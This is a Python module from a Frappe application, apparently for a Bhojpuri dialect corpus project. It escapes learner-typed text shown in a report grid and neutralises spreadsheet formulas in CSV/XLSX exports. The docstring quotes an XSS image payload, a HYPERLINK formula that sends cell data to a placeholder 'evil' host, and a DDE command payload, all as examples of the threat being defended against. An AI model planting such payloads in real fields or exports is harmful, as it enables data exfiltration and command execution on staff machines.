# Copyright (c) 2026, FOSS United and contributors
# For license information, please see license.txt
"""ONE guard for every learner-authored value a facilitator report emits.

WHY THIS FILE EXISTS
--------------------
A Desk query report has TWO consumers and each is dangerous in a different way:

* **The Desk grid.** A ``"Data"`` column is returned *unchanged* by frappe's
  formatter (``frappe/public/js/frappe/form/formatters.js`` → ``Data``) and
  frappe-datatable then assigns it with ``$cell.innerHTML = …``
  (``frappe-datatable/src/cellmanager.js``). So anything a girl typed —
  ``<img src=x onerror=…>`` — executes inside a **System Manager** session, on a
  site holding minors' names, ages, cohorts and voice recordings. This is not
  theoretical: it was reproduced against the real datatable on real DB bytes.
* **The CSV / XLSX export.** Excel, LibreOffice and Sheets *evaluate* a cell that
  opens with ``=``, ``+``, ``-`` or ``@`` (and a leading TAB/CR can shift a value
  into such a cell), so a typed ``=HYPERLINK("http://evil/?"&A1,"CLICK ME")`` or
  ``+cmd|' /C calc'!A0`` becomes a live formula / DDE prompt on the Program
  Associate's laptop. A real export produced exactly those cells — one of them
  from nothing more than a guest sign-up display name.

**The two fixes are NOT interchangeable, and that is the whole point of this
module.** HTML-escaping the export corrupted the PA's corpus spreadsheet::

    मैं &quot;बोली&quot; बोलती हूँ 🙂 — it&apos;s fine &amp; good

frappe's own export cleanup (``xlsxutils.handle_html``) un-escapes only when the
value contains BOTH ``<`` and ``>``, so bare ``&quot;`` / ``&amp;`` / ``&#39;``
survive into the file. This project exists to build a Champaran Bhojpuri dialect
corpus: silently rewriting a girl's words is a data-integrity bug, not a cosmetic
one. So — **escape for the grid, formula-guard (only) for the spreadsheet.**

Ingest already plain-texts student free text (``api._plain_text``); this module is
the *output* sink guard, which is what also renders rows captured before that fix
inert, and what protects the columns ingest does not touch.
"""
import sys

import frappe

# Spreadsheet formula / DDE leads. TAB and CR are here because they can push the
# rest of the value into the NEXT cell, where a bare "=" would then lead.
_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")

# Frappe reaches a report's execute() through the SAME query_report.run() whether
# the caller wants the grid or a file, so the destination has to be read off the
# request. These are the two honest signals; see is_spreadsheet_export().
_EXPORT_CMDS = ("frappe.desk.query_report.export_query",)
_EXPORT_FRAMES = frozenset(("_export_query", "run_export_query_job"))
_EXPORT_MODULE = "frappe.desk.query_report"
_MAX_FRAMES = 80          # a report is never 80 frames deep; just refuse to loop forever


def is_spreadsheet_export():
    """True when THIS report run is feeding a CSV/XLSX download, not the Desk grid.

    Subtle, so spelled out. ``frappe.desk.query_report.export_query`` calls
    ``run()`` internally, and ``run()`` is also the grid's own endpoint — the
    report body cannot tell them apart from its arguments. Three checks, cheapest
    first:

    1. ``frappe.flags.hikmat_report_export`` — the explicit override. This is the
       seam the tests use, and the one place future code should set if it renders
       an export outside a normal request.
    2. ``frappe.local.form_dict.cmd`` — the Export button POSTs
       ``frappe.desk.query_report.export_query``; the grid's request carries
       ``…query_report.run``. The *outer* request's cmd is therefore the truth.
    3. a ``_export_query`` / ``run_export_query_job`` frame on the stack — this
       catches the background export (``export_in_background`` → an RQ job that
       emails the file), which has no request and no form_dict at all. Last
       because walking frames is the costliest check; it runs once per report,
       not once per row.

    Anything else — e.g. a plain ``report.get_data()`` from a script — is treated
    as HTML output. That is the **fail-safe** direction: the worst case is an
    inert, entity-escaped value; never an executable one.

    Do NOT collapse this into a single check. Dropping (2) re-mangles every normal
    export; dropping (3) re-mangles the emailed one; dropping (1) makes the
    behaviour untestable.
    """
    if frappe.flags.get("hikmat_report_export"):
        return True
    form = getattr(frappe.local, "form_dict", None)
    if form and (form.get("cmd") or "") in _EXPORT_CMDS:
        return True
    frame, depth = sys._getframe(1), 0
    while frame is not None and depth < _MAX_FRAMES:
        if (frame.f_code.co_name in _EXPORT_FRAMES
                and frame.f_globals.get("__name__") == _EXPORT_MODULE):
            return True
        frame, depth = frame.f_back, depth + 1
    return False


def formula_guard(val):
    """Neutralise a spreadsheet formula lead, changing nothing else.

    A leading apostrophe is the universal "treat as text" marker in Excel /
    LibreOffice / Sheets: it is not part of the cell value and is not displayed
    once the file is opened as a spreadsheet. Devanagari, emoji, quotes,
    apostrophes and ``&`` all pass through byte-for-byte — that is required, the
    export IS the dialect corpus.
    """
    s = "" if val is None else str(val)
    return "'" + s if s[:1] in _FORMULA_LEAD else s


def safe_cell(val, grid_limit=None, ellipsis="…"):
    """Guard ONE learner-authored value for whichever destination this run feeds.

    ``grid_limit`` caps the value in the DESK GRID ONLY, and cuts it *visibly* (an
    ellipsis is appended) so a facilitator can never mistake a cut string for the
    whole of what a girl wrote. It deliberately does NOT apply to the export: a
    column width is a display concern, whereas the exported file is the corpus and
    must contain the complete utterance. Truncation happens before escaping, so a
    cap can never slice an entity in half.
    """
    s = "" if val is None else str(val)
    if is_spreadsheet_export():
        return formula_guard(s)
    if grid_limit and len(s) > grid_limit:
        s = s[:grid_limit].rstrip() + ellipsis
    # Grid path: escape first (that is what makes the markup inert), then guard the
    # lead anyway — escaping leaves "=" and "+" untouched, and a facilitator who
    # copies grid cells into a spreadsheet must not carry a live formula across.
    return formula_guard(frappe.utils.escape_html(s))


def guard_rows(rows, *fields, grid_limits=None):
    """Apply safe_cell to `fields` of every dict row, in place; returns `rows`.

    `grid_limits` is an optional {fieldname: chars} map, applied to the Desk grid
    only — see safe_cell.

    Guard LEARNER-authored columns only. Leave columns whose value is a REAL
    docname (Student — an autoname hash; Cohort, Campus — staff-created): the grid
    turns those into hrefs and a guard apostrophe would break the link, and none of
    them ever came from a girl's keyboard. A column merely *declared* Link whose
    value is client-supplied free text (`track` in Lesson Attempt) does need the
    guard — a broken href on a malicious value is the desired outcome.
    """
    grid_limits = grid_limits or {}
    for r in rows:
        for fn in fields:
            if fn in r:
                r[fn] = safe_cell(r[fn], grid_limits.get(fn))
    return rows
